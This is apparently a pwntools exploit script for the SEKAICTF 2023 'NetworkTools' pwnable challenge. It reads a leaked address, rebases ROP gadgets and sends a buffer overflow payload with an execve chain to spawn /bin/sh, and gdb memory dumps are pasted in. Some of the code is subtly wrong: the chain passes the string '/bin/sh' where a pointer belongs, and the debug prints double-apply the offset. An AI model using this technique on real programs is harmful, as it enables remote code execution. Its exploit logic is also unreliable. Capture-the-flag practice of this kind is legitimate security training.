from pwn import *

# io = process('./nettools')
io = gdb.debug('./nettools', """
    start
    b *nettools::ip_lookup+1029
""")

context.binary = './nettools'

choice = 0x7a03c
pop_rax_ret = 0x000000000000ecaa
pop_rdi_ret = 0x000000000000a0ef
pop_rsi_syscall = 0x0000000000025ade
ret = 0x000000000000901a
binsh = 0x6010e
sh = 0x8d9a8


io.recvuntil(b'Opss! Something is leaked:')
leak_addr = int(io.recvline(), 16)

pop_rax_ret += leak_addr - choice
pop_rdi_ret += leak_addr - choice
pop_rsi_syscall += leak_addr - choice
ret += leak_addr - choice
# strings --radix=x nettools  | grep /bin/sh
binsh += leak_addr - choice
sh += leak_addr - choice

print(hex(leak_addr))
print(hex(leak_addr - choice + pop_rax_ret))
print(hex(leak_addr - choice + pop_rdi_ret))
print(hex(leak_addr - choice + pop_rsi_syscall))


"""
->   0x55fbf979803c <_ZN8nettools6CHOICE17h0d0daa1684b4400fE>:    add    eax,DWORD PTR [rax]
   0x55fbf979803e <_ZN8nettools6CHOICE17h0d0daa1684b4400fE+2>:  add    BYTE PTR [rax],al
   0x55fbf9798040 <__rust_alloc_error_handler_should_panic>:    add    BYTE PTR [rax],al
   0x55fbf9798042:      add    BYTE PTR [rax],al
   0x55fbf9798044 <_ZN3std2rt7cleanup7CLEANUP17h5050a45c6957db6aE>:     add    BYTE PTR [rax],al
   0x55fbf9798046 <_ZN3std2rt7cleanup7CLEANUP17h5050a45c6957db6aE+2>:   add    BYTE PTR [rax],al
   0x55fbf9798048 <_ZN3std2io5stdio19OUTPUT_CAPTURE_USED17h7b682121806bb745E.0>:        add    BYTE PTR [rax],al
   0x55fbf979804a:      add    BYTE PTR [rax],al
   0x55fbf979804c:      add    BYTE PTR [rax],al
   0x55fbf979804e:      add    BYTE PTR [rax],al
"""


offset = 344
payload = b'A' * 399 + b'\x00' + b'B' * offset
# # write
# payload += pack(pop_rax_ret)
# payload += pack(1)
# payload += pack(pop_rdi_ret)
# payload += pack(leak_addr)
# payload += pack(pop_rsi_syscall)
# payload += pack(0)

# payload += pack(ret)
payload += pack(pop_rax_ret)
payload += pack(59)
payload += pack(pop_rdi_ret)
payload += b'/bin/sh\x00'
payload += pack(pop_rsi_syscall)
payload += pack(0)

io.sendline(b'3')
io.sendline(payload)

# io.sendline(b'3')
# io.sendline(b'A' * 401 + b'\x00' + patt)

io.interactive()

"""
gdb-peda$ info proc map

Mapped address spaces:                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                     
          Start Addr           End Addr       Size     Offset  Perms  objfile                                                                                                                                                                        
      0x560793eea000     0x560793ef3000     0x9000        0x0  r--p   /workspaces/ctf-problems/SEKAICTF_2023/pwnable/NetworkTools/nettools                                                                                                           
      0x560793ef3000     0x560793f4a000    0x57000     0x9000  r-xp   /workspaces/ctf-problems/SEKAICTF_2023/pwnable/NetworkTools/nettools                                                                                                           
      0x560793f4a000     0x560793f5f000    0x15000    0x60000  r--p   /workspaces/ctf-problems/SEKAICTF_2023/pwnable/NetworkTools/nettools                                                                                                           
      0x560793f5f000     0x560793f64000     0x5000    0x74000  r--p   /workspaces/ctf-problems/SEKAICTF_2023/pwnable/NetworkTools/nettools                                                                                                           
      0x560793f64000     0x560793f65000     0x1000    0x79000  rw-p   /workspaces/ctf-problems/SEKAICTF_2023/pwnable/NetworkTools/nettools                                                                                                           
      0x560794fa0000     0x560794fc1000    0x21000        0x0  rw-p   [heap]                                                                      
"""